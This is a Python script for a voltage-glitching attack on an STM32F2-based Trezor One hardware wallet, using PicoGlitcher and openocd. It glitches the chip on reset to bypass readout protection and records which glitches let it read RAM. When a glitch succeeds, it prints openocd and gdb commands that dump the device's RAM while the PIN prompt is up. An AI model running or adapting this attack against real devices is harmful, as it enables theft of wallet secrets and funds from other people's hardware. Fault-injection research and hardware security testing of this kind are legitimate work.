#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE 'warning: polling failed'

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus.DebugInterface import DebugInterface
from findus import Database, PicoGlitcher, Helper

class DerivedDebugInterface(DebugInterface):
    def characterize(self, response:str, mem:int):
        # possibly ok
        if mem is not None:
            if mem != 0x00:
                return b'success: RDP inactive'
            else:
                return b'success: read zero'
        # Expected: no connection
        elif "Error: init mode failed (unable to connect to the target)" in response:
            return b'expected: no connection'
        # Warning: Polling failed
        elif "Polling target" in response:
            return b'warning: polling failed'
        # Warning: Device lockup
        if "clearing lockup after double fault" in response:
            return b'warning: lock-up'
        # Warning: failed to read memory
        elif "Error: Failed to read memory at" in response:
            return b'warning: failed to read memory'
        # Warning: else
        elif "Warning" in response:
            return b'warning: default warning'
        # no response
        return b'error: no response'

class Main:
    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = PicoGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico, ext_power=args.power, ext_power_voltage=3.3)

        # trigger on the rising edge of the reset signal
        self.glitcher.rising_edge_trigger(pin_trigger=args.trigger_input)

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store)
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        # STLink Debugger
        self.debugger = DerivedDebugInterface(target="stm32f2x")

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        experiment_id = 0
        while True:
            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)
            self.glitcher.arm(delay, length)

            # reset target (this triggers the glitch)
            #self.glitcher.reset(0.01)
            self.glitcher.power_cycle_reset(0.2)
            #time.sleep(0.01)

            # block until glitch
            response = ""
            try:
                self.glitcher.block(timeout=1)
                memory, response = self.debugger.read_address(0x20000000)
                state = self.debugger.characterize(response=response, mem=memory)
                #print(f"Content of register: {memory}")
            except Exception as e:
                print(e)
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_reset()
                time.sleep(0.2)
                state = b'warning: timout'

            # classify state
            color = self.glitcher.classify(state)

            # add to database
            state_str = str(state).encode("utf-8") + b": " + response.encode("utf-8")
            self.database.insert(experiment_id, delay, length, color, state_str)

            # monitor
            #print(response)
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state}", color))

            # increase experiment id
            experiment_id += 1

            # Dump finished
            #time.sleep(0.2)
            if self.args.halt and b'success' in state:
                self.glitcher.reset(0.1)
                print("[+] Now connect the Trezor One via USB with your computer and go to the Trezor Suite app.")
                print("    Wait for the Trezor One to connect. Do not abort this script!")
                print("    If the pin input on the Trezor comes up, execute the following command to dump the memory:")
                print('    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; reset run"')
                print("    Connect to openocd via gdb or telnet:")
                print("    $ telnet localhost 4444")
                print("    $ arm-none-eabi-gdb")
                print("    (gdb) target remote :3333")
                print("    (gdb) monitor reset halt")
                print("    (gdb) continue")
                print("    Or dump the RAM as is with the following command:")
                print('    $ openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32f4x.cfg -c "init; dump_image ram.bin 0x20000000 0x1fffffff; exit"')
                while True:
                    time.sleep(0.1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--power", required=False, help="rk6006 port", default=None)
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--halt", required=False, action='store_true', help="halt execution if successful glitch is detected")
    parser.add_argument("--trigger-input", required=False, default="default", help="The trigger input to use (default, alt, ext1, ext2). The inputs ext1 and ext2 require the PicoGlitcher v2.")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)
